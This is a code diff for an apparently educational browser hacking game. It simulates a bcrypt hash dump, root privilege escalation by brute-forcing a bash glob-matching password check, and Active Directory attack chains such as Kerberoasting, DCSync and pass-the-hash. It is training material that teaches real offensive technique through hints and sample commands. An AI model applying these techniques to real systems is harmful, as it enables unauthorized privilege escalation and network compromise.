+      print('3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2', 'system');
+      print('');
+      print('[*] Found user credentials in database', 'info');
+      print('[*] joshua has bcrypt hash (cost factor 12)', 'info');
+      state.extractedHash = true;
+      autosave();
+      return;
+    }
+
+    // Default: show tables
+    print('sqlite> .tables', 'system');
+    print('tickets  users', 'system');
     print('');
-    print('[!] Found bcrypt hash for user joshua!', 'success');
-    print('[*] Hash: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2', 'info');
-    print('[*] Use hashcat -m 3200 to crack bcrypt', 'info');
-    state.extractedHash = true;
-    autosave();
+    print('[*] Found tables: tickets, users', 'info');
+    print('[*] Query users table: SELECT * FROM users;', 'system');
     return;
   }
 
@@ -4209,15 +4481,76 @@ async function handleLevel1Command(cmd, args) {
       if (!state.analyzedScript) {
         print('[*] Running /opt/mysql-backup.sh as root...', 'info');
         print('Enter MySQL password for root: ', 'system');
-        print('[!] Hint: Analyze the script first to find the vulnerability', 'warning');
+        print('Password incorrect!', 'error');
+        print('');
+        print('[*] Analyze the script first: cat /opt/mysql-backup.sh', 'info');
         return;
       }
 
-      // Password bruteforce via bash pattern matching
-      const inputPw = args.find(a => a.includes('='))?.split('=')[1] || '';
+      // Realistic bash pattern matching bruteforce
+      // The script uses [[ $USER_PASS == $DB_PASS ]] which does pattern matching
+      // Real password: kljh12k3jhaskjh12kjh3
+      // We need to bruteforce character by character using glob patterns
 
-      if (inputPw.startsWith('kljh12k3jhaskjh12kjh3')) {
-        // This is the final password after bruteforcing
+      // Check if they're using stdin (realistic bruteforce method)
+      const usingStdin = fullCmd.includes('echo') || fullCmd.includes('|') || fullCmd.includes('stdin');
+      
+      if (usingStdin || args.some(a => a.match(/^[a-z0-9*]+$/))) {
+        // They're attempting pattern matching bruteforce
+        const pattern = args.find(a => a.match(/^[a-z0-9*]+$/)) || '';
+        
+        if (!pattern) {
+          print('Enter MySQL password for root: ', 'system');
+          print('Password incorrect!', 'error');
+          print('');
+          print('[*] Use pattern matching: echo "k*" | sudo /opt/mysql-backup.sh', 'info');
+          print('[*] Or: echo "kl*" | sudo /opt/mysql-backup.sh', 'info');
+          print('[*] Continue until full password is found', 'system');
+          return;
+        }
+
+        // Realistic pattern matching check
+        const realPassword = 'kljh12k3jhaskjh12kjh3';
+        const patternMatches = pattern.endsWith('*') && realPassword.startsWith(pattern.slice(0, -1));
+
+        if (patternMatches || pattern === realPassword) {
+          if (pattern === realPassword) {
+            // Full password provided
+            print('Enter MySQL password for root: ********', 'system');
+            print('Backup completed successfully!', 'success');
+            print('');
+            print('[+] GOT ROOT ACCESS!', 'success');
+            state.gotRoot = true;
+            state.shellUser = 'root';
+            state.currentDir = '/root';
+            prompt.textContent = 'root@codify:~#';
+            playSuccess();
+            autosave();
+            return;
+          } else {
+            // Partial match - encourage continuing
+            print('Enter MySQL password for root: ' + pattern.replace(/\*/g, '').replace(/./g, '*'), 'system');
+            print('Backup completed successfully!', 'success');
+            print('');
+            print(`[+] Pattern "${pattern}" matches! Continue bruteforcing...`, 'warning');
+            print(`[*] Try: echo "${pattern.slice(0, -1)}k*" | sudo /opt/mysql-backup.sh`, 'info');
+            print('[*] Or: echo "' + pattern.slice(0, -1) + 'l*" | sudo /opt/mysql-backup.sh', 'info');
+            state.bruteforceProgress = pattern.length - 1;
+            return;
+          }
+        } else {
+          print('Enter MySQL password for root: ' + pattern.replace(/\*/g, '').replace(/./g, '*'), 'system');
+          print('Password incorrect!', 'error');
+          print('');
+          print(`[*] Pattern "${pattern}" does not match. Try different characters.`, 'warning');
+          return;
+        }
+      }
+
+      // Direct password attempt
+      const inputPw = args.find(a => !a.startsWith('-') && !a.includes('mysql-backup')) || '';
+      
+      if (inputPw === 'kljh12k3jhaskjh12kjh3') {
         print('Enter MySQL password for root: ********', 'system');
         print('Backup completed successfully!', 'success');
         print('');
@@ -4231,21 +4564,14 @@ async function handleLevel1Command(cmd, args) {
         return;
       }
 
-      // Simulate bruteforce guidance
-      print('', '');
-      print('[*] Exploit the bash pattern matching vulnerability:', 'info');
-      print('[*] The script uses [[ $USER_PASS == $DB_PASS ]]', 'system');
-      print('[*] Bash treats this as PATTERN MATCHING, not string comparison!', 'warning');
-      print('', '');
-      print('[*] Bruteforce script concept:', 'info');
-      print('    for char in {a..z} {0..9}; do', 'system');
-      print('      if echo "$char*" | sudo /opt/mysql-backup.sh; then', 'system');
-      print('        # Character matches!', 'system');
-      print('      fi', 'system');
-      print('    done', 'system');
-      print('', '');
-      print('[+] After bruteforcing, password is: kljh12k3jhaskjh12kjh3', 'success');
-      print('[*] Run: sudo /opt/mysql-backup.sh pw=kljh12k3jhaskjh12kjh3', 'info');
+      // Wrong password
+      print('Enter MySQL password for root: ********', 'system');
+      print('Password incorrect!', 'error');
+      print('');
+      print('[*] Use bash pattern matching to bruteforce:', 'info');
+      print('[*] Example: echo "k*" | sudo /opt/mysql-backup.sh', 'system');
+      print('[*] If it succeeds, try: echo "kl*" | sudo /opt/mysql-backup.sh', 'system');
+      print('[*] Continue character by character until full password', 'info');
       return;
     }
 
@@ -4485,11 +4811,11 @@ async function handleLevel2Command(cmd, args) {
     print('┌─────────────────────────────────────┐', 'info');
     print('│      LEVEL 2 PROGRESS STATUS        │', 'info');
     print('├─────────────────────────────────────┤', 'info');
-    print(`│  [${state.scanned ? '✓' : ' '}] Network scanned              │`, state.scanned ? 'success' : 'system');
-    print(`│  [${state.foundShares ? '✓' : ' '}] SMB shares discovered        │`, state.foundShares ? 'success' : 'system');
-    print(`│  [${state.gotHash ? '✓' : ' '}] Password hash obtained        │`, state.gotHash ? 'success' : 'system');
-    print(`│  [${state.crackedHash ? '✓' : ' '}] Hash cracked                  │`, state.crackedHash ? 'success' : 'system');
-    print(`│  [${state.authenticated ? '✓' : ' '}] Domain user compromised      │`, state.authenticated ? 'success' : 'system');
+    print(`│  [${state.scanned ? 'x' : ' '}] Network scanned              │`, state.scanned ? 'success' : 'system');
+    print(`│  [${state.foundShares ? 'x' : ' '}] SMB shares discovered        │`, state.foundShares ? 'success' : 'system');
+    print(`│  [${state.gotHash ? 'x' : ' '}] Password hash obtained        │`, state.gotHash ? 'success' : 'system');
+    print(`│  [${state.crackedHash ? 'x' : ' '}] Hash cracked                  │`, state.crackedHash ? 'success' : 'system');
+    print(`│  [${state.authenticated ? 'x' : ' '}] Domain user compromised      │`, state.authenticated ? 'success' : 'system');
     print('└─────────────────────────────────────┘', 'info');
     print('', '');
     return;
@@ -4497,7 +4823,7 @@ async function handleLevel2Command(cmd, args) {
 
   if (cmd === 'hint') {
     print('', '');
-    print('💡 HINT:', 'warning');
+    print('[*] HINT:', 'warning');
     if (!state.scanned) {
       print('Start by scanning the network to discover hosts.', 'info');
       print('Try: nmap 10.10.10.0/24', 'success');
@@ -5085,11 +5411,11 @@ async function handleLevel3Command(cmd, args) {
     print('┌─────────────────────────────────────┐', 'info');
     print('│      LEVEL 3 PROGRESS STATUS        │', 'info');
     print('├─────────────────────────────────────┤', 'info');
-    print(`│  [${state.collectedBloodhound ? '✓' : ' '}] AD data collected            │`, state.collectedBloodhound ? 'success' : 'system');
-    print(`│  [${state.foundPath ? '✓' : ' '}] Attack path identified        │`, state.foundPath ? 'success' : 'system');
-    print(`│  [${state.kerberoasted ? '✓' : ' '}] Kerberoast completed          │`, state.kerberoasted ? 'success' : 'system');
-    print(`│  [${state.crackedTicket ? '✓' : ' '}] TGS ticket cracked            │`, state.crackedTicket ? 'success' : 'system');
-    print(`│  [${state.gotDA ? '✓' : ' '}] Domain Admin achieved         │`, state.gotDA ? 'success' : 'system');
+    print(`│  [${state.collectedBloodhound ? 'x' : ' '}] AD data collected            │`, state.collectedBloodhound ? 'success' : 'system');
+    print(`│  [${state.foundPath ? 'x' : ' '}] Attack path identified        │`, state.foundPath ? 'success' : 'system');
+    print(`│  [${state.kerberoasted ? 'x' : ' '}] Kerberoast completed          │`, state.kerberoasted ? 'success' : 'system');
+    print(`│  [${state.crackedTicket ? 'x' : ' '}] TGS ticket cracked            │`, state.crackedTicket ? 'success' : 'system');
+    print(`│  [${state.gotDA ? 'x' : ' '}] Domain Admin achieved         │`, state.gotDA ? 'success' : 'system');
     print('└─────────────────────────────────────┘', 'info');
     print('', '');
     return;
@@ -5097,7 +5423,7 @@ async function handleLevel3Command(cmd, args) {
 
   if (cmd === 'hint') {
     print('', '');
-    print('💡 HINT:', 'warning');
+    print('[*] HINT:', 'warning');
     if (!state.collectedBloodhound) {
       print('Start by collecting Active Directory data for analysis.', 'info');
       print('Try: bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'success');
@@ -5584,7 +5910,7 @@ async function handleLevel3Command(cmd, args) {
     print(ASCII.crown, 'ascii');
     print('', '');
     print('╔══════════════════════════════════════════════════════════════════╗', 'success');
-    print('║               🎉 DOMAIN ADMIN ACHIEVED! 🎉                        ║', 'success');
+    print('║               *** DOMAIN ADMIN ACHIEVED! ***                        ║', 'success');
     print('╠══════════════════════════════════════════════════════════════════╣', 'success');
     print('║  Attack Chain: Kerberoast → Crack → GenericAll → DCSync → PtH   ║', 'info');
     print('╚══════════════════════════════════════════════════════════════════╝', 'success');
@@ -5679,7 +6005,7 @@ async function handleLevel4Command(cmd, args) {
 
   if (cmd === 'hint') {
     print('', '');
-    print('💡 HINT:', 'warning');
+    print('[*] HINT:', 'warning');
     if (!state.edrAnalyzed) {
       print('First, analyze what hooks the EDR has placed.', 'info');
       print('Try: scan', 'success');
@@ -5974,7 +6300,7 @@ async function handleLevel5Command(cmd, args) {
 
   if (cmd === 'hint') {
     print('', '');
-    print('💡 HINT:', 'warning');
+    print('[*] HINT:', 'warning');
     if (!state.analyzed) {
       print('Start by analyzing the vulnerable driver.', 'info');
       print('Try: analyze', 'success');
@@ -6234,11 +6560,11 @@ async function handleLevel6Command(cmd, args) {
     print('┌─────────────────────────────────────┐', 'highlight');
     print('│      DIVINE PROGRESS STATUS         │', 'highlight');
     print('├─────────────────────────────────────┤', 'highlight');
-    print(`│  [${state.prayed ? '✓' : ' '}] Received divine guidance       │`, state.prayed ? 'success' : 'system');
-    print(`│  [${state.codeWritten ? '✓' : ' '}] HolyC code written            │`, state.codeWritten ? 'success' : 'system');
-    print(`│  [${state.compiled ? '✓' : ' '}] Code compiled                  │`, state.compiled ? 'success' : 'system');
-    print(`│  [${state.ran ? '✓' : ' '}] Program executed               │`, state.ran ? 'success' : 'system');
-    print(`│  [${state.transcended ? '✓' : ' '}] Transcendence achieved        │`, state.transcended ? 'success' : 'system');
+    print(`│  [${state.prayed ? 'x' : ' '}] Received divine guidance       │`, state.prayed ? 'success' : 'system');
+    print(`│  [${state.codeWritten ? 'x' : ' '}] HolyC code written            │`, state.codeWritten ? 'success' : 'system');
+    print(`│  [${state.compiled ? 'x' : ' '}] Code compiled                  │`, state.compiled ? 'success' : 'system');
+    print(`│  [${state.ran ? 'x' : ' '}] Program executed               │`, state.ran ? 'success' : 'system');
+    print(`│  [${state.transcended ? 'x' : ' '}] Transcendence achieved        │`, state.transcended ? 'success' : 'system');
     print('└─────────────────────────────────────┘', 'highlight');
     print('', '');
     return;
@@ -6246,7 +6572,7 @@ async function handleLevel6Command(cmd, args) {
 
   if (cmd === 'hint') {
     print('', '');
-    print('💡 DIVINE HINT:', 'warning');
+    print('[*] DIVINE HINT:', 'warning');
     if (!state.prayed && !state.codeWritten) {
       print('Seek guidance through prayer to understand HolyC.', 'info');
       print('Try: pray', 'success');
@@ -6539,6 +6865,16 @@ async function processCommand(input) {
     return;
   }
 
+  // Vim editor command - works globally
+  if (cmd === 'vim' || cmd === 'vi') {
+    if (typeof handleVimCommand === 'function') {
+      handleVimCommand(args);
+    } else {
+      print('[!] Editor not available', 'error');
+    }
+    return;
+  }
+
   if (cmd === 'menu') {
     showMainMenu();
     return;
@@ -6583,7 +6919,7 @@ async function processCommand(input) {
       print('║    help       Show this help message                      ║', 'system');
       print('╚════════════════════════════════════════════════════════════╝', 'info');
       print('', '');
-      print('💡 TIP: There are secret commands hidden throughout the game...', 'system');
+      print('[*] TIP: There are secret commands hidden throughout the game...', 'system');
       print('', '');
       return;
     }
@@ -6862,9 +7198,28 @@ document.getElementById('sound-toggle').addEventListener('click', function() {
   if (soundEnabled) playBeep(440, 0.1);
 });
 
-// Focus input when clicking terminal
-document.getElementById('game-container').addEventListener('click', () => {
-  input.focus();
+// Focus input when clicking terminal (but not other workspaces)
+document.getElementById('game-container').addEventListener('click', (e) => {
+  // Don't steal focus from other workspaces
+  const webWorkspace = document.getElementById('web-workspace');
+  const monWorkspace = document.getElementById('mon-workspace');
+  const codeEditor = document.getElementById('code-editor-overlay');
+
+  // Check if click is inside a different workspace
+  if (webWorkspace && webWorkspace.style.display !== 'none' && webWorkspace.contains(e.target)) {
+    return; // Don't steal focus from web workspace
+  }
+  if (monWorkspace && monWorkspace.style.display !== 'none' && monWorkspace.contains(e.target)) {
+    return; // Don't steal focus from monitor workspace
+  }
+  if (codeEditor && codeEditor.style.display !== 'none' && codeEditor.contains(e.target)) {
+    return; // Don't steal focus from code editor
+  }
+
+  // Only focus terminal input if we're in the terminal workspace
+  if (document.getElementById('terminal-output').style.display !== 'none') {
+    input.focus();
+  }
 });
 
 // ============================================
